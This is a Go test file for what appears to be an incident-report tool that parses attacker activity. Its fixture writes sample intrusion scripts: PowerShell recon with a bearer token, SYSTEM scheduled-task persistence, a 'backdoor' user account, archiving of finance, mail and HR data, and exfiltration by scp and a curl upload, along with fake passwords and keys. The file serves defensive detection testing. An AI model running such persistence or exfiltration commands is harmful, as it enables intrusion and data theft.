package command

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// intrusion writes a folder of scripts and outputs that sign in, persist,
// collect and send out, and returns it with the token and the encoded key
// document its files hold.
func intrusion(t *testing.T) (folder, token, document string) {
	t.Helper()
	part := func(text string) string { return base64.RawURLEncoding.EncodeToString([]byte(text)) }
	token = part(`{"alg":"RS256","typ":"JWT"}`) + "." +
		part(`{"aud":"https://graph.microsoft.com","iss":"https://sts.windows.net/6f9619ff-8b86-4d11-b42d-00c04fc964ff/","upn":"adm@contoso.onmicrosoft.com","scp":"User.Read Mail.Read","exp":1793527200}`) +
		"." + part("signature")
	document = base64.StdEncoding.EncodeToString([]byte(`{"type": "service_account", "project_id": "acme-prod-4711", "client_email": "deployer@acme-prod-4711.iam.gserviceaccount.com"}`))
	folder = t.TempDir()
	for name, text := range map[string]string{
		"20261101_090000_step01_recon.ps1": "# Step 1 - Check user: verify the account exists and list the domain\n" +
			"whoami /all\n" +
			"Invoke-WebRequest https://www.google.com -UseBasicParsing | Out-Null\n" +
			"Invoke-RestMethod -Uri \"https://graph.microsoft.com/v1.0/users\" -Headers @{Authorization = \"Bearer " + token + "\"}\n",
		"recon_20261101_090030.txt": "User Name      SID\n============== ==============================================\n" +
			"corp\\jdoe      S-1-5-21-1111111111-2222222222-3333333333-1105\n\n===== Access Token =====\n" +
			"Last login: Mon Oct 20 10:00:00 2026 from 10.0.0.5\n",
		"20261101_091000_step02_persist.ps1": "schtasks /create /s dc01.corp.local /u corp\\admin /p Passw0rd!23 /ru SYSTEM /sc onlogon /tn \"WindowsUpdateCheck\" /tr \"powershell -ep bypass -f C:\\Users\\Public\\u.ps1\"\n" +
			"$action = New-ScheduledTaskAction -Execute \"C:\\ProgramData\\svc\\agent.exe\"\n" +
			"Register-ScheduledTask -TaskName \"EdgeUpdateTaskMachine\" -Action $action\n" +
			"net user backdoor P@ssw0rd123 /add\n",
		"20261101_092000_step03_collect.sh": "#!/bin/bash\n# Archive: compress the loot before it leaves\n" +
			"tar czf /tmp/loot.tar.gz /srv/finance\n7z a -pInfected1 /tmp/mail.7z /var/mail\nrar a /tmp/hr.rar /srv/hr\n" +
			"mysqldump crm | gzip > /tmp/crm.sql.gz\n" +
			"sshpass -p 'Winter2026!' scp /tmp/loot.tar.gz root@10.0.0.5:/tmp/\n" +
			"curl -u admin:Hunter2pass -T /tmp/mail.7z https://nexus.corp.local/repository/raw/mail.7z\n" +
			"curl -H \"Authorization: Basic c3ZjX2FwaTpTdXAzclMzY3JldCE=\" https://jenkins.corp.local/api/json\n",
		"keys_20261101_093000.json": `{"name": "projects/acme-prod-4711/serviceAccounts/deployer/keys/1", "privateKeyData": "` + document + `"}`,
	} {
		if err := os.WriteFile(filepath.Join(folder, name), []byte(text), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return folder, token, document
}

// A credential is listed once, with whose it is and what it is used
// against; an encoded one is written decoded in the report and as it stands
// in the saved table; and a line of signs or a sentence is none.
func TestReportLinksAndDecodes(t *testing.T) {
	folder, token, document := intrusion(t)
	readout, saved := report(t, folder, "summary", "exposure")
	table := rows(t, filepath.Join(saved, "exposure.csv"))
	const claims = "upn=adm@contoso.onmicrosoft.com; aud=https://graph.microsoft.com; scp=User.Read Mail.Read; exp=2026-11-01T10:00:00Z; iss=https://sts.windows.net/6f9619ff-8b86-4d11-b42d-00c04fc964ff/"
	const key = "type=service_account; project_id=acme-prod-4711; client_email=deployer@acme-prod-4711.iam.gserviceaccount.com"
	for _, want := range []map[string]string{
		{"kind": "password", "value": "Passw0rd!23", "account": "admin", "service": "dc01.corp.local", "seen": "used"},
		{"kind": "password", "value": "P@ssw0rd123", "account": "backdoor"},
		{"kind": "password", "value": "Winter2026!", "account": "root", "service": "10.0.0.5"},
		{"kind": "password", "value": "Hunter2pass", "account": "admin", "service": "nexus.corp.local"},
		{"kind": "password", "value": "Sup3rS3cret!", "account": "svc_api", "service": "jenkins.corp.local"},
		{"kind": "password", "value": token, "decoded": claims, "account": "adm@contoso.onmicrosoft.com", "form": "token", "service": "Microsoft 365"},
		{"kind": "password", "value": document, "decoded": key, "account": "deployer@acme-prod-4711.iam.gserviceaccount.com", "form": "key", "service": "Google Cloud"},
	} {
		find(t, table, want)
	}
	var users []string
	for _, row := range table {
		value, _ := row["value"].(string)
		switch {
		case row["kind"] == "username":
			users = append(users, value)
		case row["kind"] == "password" && row["decoded"] == nil && !strings.ContainsAny(value, "0123456789"):
			t.Errorf("the exposure lists %q as a secret", value)
		}
	}
	slices.Sort(users)
	if want := []string{"adm@contoso.onmicrosoft.com", "admin", "backdoor", "deployer@acme-prod-4711.iam.gserviceaccount.com", "jdoe", "root", "svc_api"}; !slices.Equal(users, want) {
		t.Errorf("usernames = %q, want %q", users, want)
	}
	for _, want := range []string{
		"\n  Passwords and secrets (7)\n",
		"  password of admin, dc01.corp.local ",
		"  password of root, 10.0.0.5 ",
		"  password of svc_api, jenkins.corp.local ",
		"[x] " + claims + "  token of adm@contoso.onmicrosoft.com, Microsoft 365 ",
		"\n  Microsoft 365 (2)\n    [x] " + claims + "  token of adm@contoso.onmicrosoft.com  ",
		"\n  Google Cloud (2)\n    [x] " + key + "  key of deployer@acme-prod-4711.iam.gserviceaccount.com  ",
	} {
		if !strings.Contains(readout, want) {
			t.Errorf("the readout lacks %q:\n%s", want, readout)
		}
	}
	for _, gone := range []string{token, document, "====", "  verify  ", "  Mon  "} {
		if strings.Contains(readout, gone) {
			t.Errorf("the readout holds %q", gone)
		}
	}
}

// A task is listed with its name and what it runs, an archive of any
// archiver by its file, and a host of a vendor not at all.
func TestReportTargetsOfActivities(t *testing.T) {
	folder, _, _ := intrusion(t)
	readout, saved := report(t, folder, "targeted")
	for _, want := range []string{
		"\n  Task (2)\n" +
			"    [x] WindowsUpdateCheck     powershell -ep bypass -f C:\\Users\\Public\\u.ps1  ScheduledTaskCreation\n",
		"    [x] EdgeUpdateTaskMachine  C:\\ProgramData\\svc\\agent.exe                    ScheduledTaskCreation\n",
		"\n  Archive (4)\n    [!] /tmp/loot.tar.gz  ArchiveCreation\n",
		"    [!] /tmp/mail.7z      ArchiveCreation\n",
		"    [!] /tmp/hr.rar       ArchiveCreation\n",
		"    [!] /tmp/crm.sql.gz   ArchiveCreation\n",
		"\n  Hostnames (3)\n    [!] dc01.corp.local     prior  ",
		"    [!] jenkins.corp.local  prior  ",
		"    [!] nexus.corp.local    prior  ",
	} {
		if !strings.Contains(readout, want) {
			t.Errorf("the readout lacks %q:\n%s", want, readout)
		}
	}
	for _, gone := range []string{"\n  Usernames (", "[!] www.google.com", "[!] graph.microsoft.com"} {
		if strings.Contains(readout, gone) {
			t.Errorf("the readout holds %q", gone)
		}
	}
	if page := readFile(t, filepath.Join(saved, "report.html")); !strings.Contains(page, "<th>task name</th><th>runs</th><th>acted on by</th>") {
		t.Errorf("report.html does not head the columns of the tasks with the task name and what it runs")
	}
	for _, row := range rows(t, filepath.Join(saved, "targeted.json")) {
		if value, _ := row["value"].(string); strings.HasSuffix(value, "google.com") || strings.HasSuffix(value, "microsoft.com") {
			t.Errorf("targeted.json lists %s, a host of a vendor", value)
		}
	}
}

// An impact lists every exposed credential, an entry the accounts and
// credentials that the lines and the files behind it hold, and no entry a
// command or a script.
func TestReportConcernsWhatIsExposed(t *testing.T) {
	folder, _, _ := intrusion(t)
	readout, saved := report(t, folder, "impact", "remediation", "mitigation")
	table := rows(t, filepath.Join(saved, "report.json"))
	every := find(t, table, map[string]string{"section": "impact", "item": "Credentials exposed"})
	listed, _ := every["exposed"].(string)
	held := 0
	for _, row := range rows(t, filepath.Join(saved, "exposure.csv")) {
		if row["kind"] != "password" {
			continue
		}
		held++
		shown := row["value"].(string)
		if decoded, _ := row["decoded"].(string); decoded != "" {
			shown = decoded
		}
		if !strings.Contains(listed, ": "+shown) {
			t.Errorf("the impact does not list the credential %q:\n%s", shown, listed)
		}
	}
	if got := len(strings.Split(listed, "\n")); held != 7 || got != held {
		t.Errorf("the impact lists %d credentials of the %d that are exposed, want all 7", got, held)
	}
	for _, tt := range []struct{ section, item, exposed string }{
		{"impact", "Persistence established", "password of backdoor: P@ssw0rd123\npassword of admin, dc01.corp.local: Passw0rd!23"},
		{"remediation", "Remove persistence", "password of backdoor: P@ssw0rd123\npassword of admin, dc01.corp.local: Passw0rd!23"},
		{"mitigation", "M1032 Multi-factor Authentication", "password of backdoor: P@ssw0rd123\npassword of admin, dc01.corp.local: Passw0rd!23"},
	} {
		if row := find(t, table, map[string]string{"section": tt.section, "item": tt.item}); row["exposed"] != tt.exposed {
			t.Errorf("%s %s: exposed = %q, want %q", tt.section, tt.item, row["exposed"], tt.exposed)
		}
	}
	for _, gone := range []string{"schtasks /create", "net user backdoor", "step02_persist.ps1", "tar czf", "\n      targets  ", "\n      what     "} {
		if strings.Contains(readout, gone) {
			t.Errorf("the readout holds %q, which is a command, a script or what one acts on:\n%s", gone, readout)
		}
	}
}
